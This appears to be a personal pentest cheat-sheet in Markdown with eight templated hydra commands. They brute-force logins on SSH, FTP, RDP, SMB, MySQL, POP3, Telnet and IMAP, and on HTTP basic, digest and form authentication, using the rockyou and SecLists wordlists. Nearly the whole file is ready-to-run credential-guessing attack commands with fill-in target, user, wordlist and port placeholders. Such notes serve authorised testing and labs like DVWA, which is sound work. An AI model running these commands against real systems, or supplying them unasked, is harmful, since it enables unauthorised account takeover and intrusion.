# hydra

> Only the patterns you actually use. Eight entries, nothing extra. `-I` (ignore restore) on every entry per your note style.

<!-- tags: hydra, brute, auth, ssh, ftp, smb, http-form -->

---

## brute simple service
Single-user + password-list against the common simple services. Service picker covers ssh/ftp/rdp/mysql/pop3/smb/telnet — same syntax, pick one.

```bash
hydra -l {{USER:str:admin}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} {{TARGET:ip}} {{SERVICE:choice:ssh,ftp,rdp,mysql,pop3,smb,telnet}} -I
```

<!-- meta: risk=medium | phase=brute | tags=brute,service,picker -->

---

## brute userlist and wordlist
Userlist × wordlist combo for when you don't know the login — same service picker.

```bash
hydra -L {{USERS:file:/usr/share/seclists/Usernames/top-usernames-shortlist.txt}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} {{TARGET:ip}} {{SERVICE:choice:ssh,ftp,rdp,mysql,pop3,smb,telnet}} -I
```

<!-- meta: risk=medium | phase=brute | tags=brute,userlist,wordlist -->

---

## http basic auth get
HTTP Basic Auth against a protected path. For non-/admin targets, swap the `/admin`.

```bash
hydra -l {{USER:str:admin}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} {{TARGET:ip}} http-get {{PATH:str:/admin}} -I
```

<!-- meta: risk=medium | phase=brute | tags=http,basic,get -->

---

## http basic auth digest
Same but digest auth — `-m /path` carries the protected URL to the http-get-digest module.

```bash
hydra -l {{USER:str:admin}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} -m {{PATH:str:/protected}} {{TARGET:ip}} http-get-digest -I
```

<!-- meta: risk=medium | phase=brute | tags=http,digest -->

---

## http post form
Classic login-form brute. Format of the service string: `path:body-with-^USER^-^PASS^:failure-marker`. `-fV` = stop on first match + verbose. Example from your DVWA notes.

```bash
hydra -l {{USER:str:admin}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} {{TARGET:ip}} http-post-form '{{FORM:str:/login:username=^USER^&password=^PASS^:Invalid}}' -fV -s {{PORT:port:80}} -t {{THREADS:int:1}} -I
```

<!-- meta: risk=medium | phase=brute | tags=http,post,form -->

---

## https post form
HTTPS variant — URL goes INSIDE the service string instead of being a positional target.

```bash
hydra -l {{USER:str:user}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} -s {{PORT:port:443}} https-post-form '{{FORM:str:https://example.com/login.php:user=^USER^&pass=^PASS^:Login failed}}' -I
```

<!-- meta: risk=medium | phase=brute | tags=https,post,form -->

---

## https form get with user list
Form brute using GET + userlist × wordlist, custom port.

```bash
hydra -L {{USERS:file:/usr/share/seclists/Usernames/top-usernames-shortlist.txt}} -P {{WORDLIST:wordlist:/usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt}} -s {{PORT:port:443}} {{TARGET:ip}} https-form-get '{{FORM:str:/login/:username=^USER^&password=^PASS^:Failed.}}' -I
```

<!-- meta: risk=medium | phase=brute | tags=https,get,form,userlist -->

---

## imap with login tricks
IMAP brute with `-e nsr` login tricks (multichoice: n=null password, s=same-as-login, r=reverse login). `tr -d ,` strips commas so hydra gets a single joined arg like `-e nsr`.

```bash
hydra -l {{USER:str:user@example.com}} -P {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}} -e $(echo "{{TRICKS:multichoice:n=null password,s=same as login,r=reverse login}}" | tr -d ,) -s {{PORT:port:993}} imap://{{TARGET:ip}} -I
```

<!-- meta: risk=medium | phase=brute | tags=imap,tricks,multichoice -->
